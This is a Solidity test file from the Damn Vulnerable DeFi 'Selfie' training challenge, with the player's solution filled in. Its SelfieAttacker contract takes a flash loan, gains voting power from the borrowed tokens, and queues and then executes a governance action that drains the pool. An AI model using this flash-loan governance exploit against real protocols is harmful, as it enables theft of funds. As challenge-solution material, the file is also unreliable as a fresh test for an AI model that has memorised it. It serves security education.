// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        // Deploy the attacker contract
        SelfieAttacker attacker = new SelfieAttacker(address(pool), address(governance), recovery);
        
        // Execute the attack
        attacker.attack();
        
        // Fast forward time to bypass the ACTION_DELAY_IN_SECONDS (2 days)
        vm.warp(block.timestamp + 2 days + 1);
        
        // Execute the queued governance action
        attacker.executeAction();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

// Attacker contract to exploit the vulnerability
contract SelfieAttacker is IERC3156FlashBorrower {
    SelfiePool private immutable pool;
    SimpleGovernance private immutable governance;
    address private immutable recovery;
    uint256 private actionId;
    
    constructor(address _pool, address _governance, address _recovery) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        recovery = _recovery;
    }
    
    function attack() external {
        // Calculate the maximum amount we can borrow
        uint256 borrowAmount = pool.maxFlashLoan(address(pool.token()));
        
        // Take the flash loan
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(pool.token()),
            borrowAmount,
            ""
        );
    }
    
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        require(msg.sender == address(pool), "Caller is not the pool");
        
        DamnValuableVotes dvToken = DamnValuableVotes(token);
        
        // Delegate voting power to this contract
        dvToken.delegate(address(this));
        
        // Queue the governance action to drain the pool
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        actionId = governance.queueAction(address(pool), 0, data);
        
        // Approve the pool to take back the tokens
        dvToken.approve(address(pool), amount);
        
        // Return the required value to indicate success
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
    
    function executeAction() external {
        governance.executeAction(actionId);
    }
}
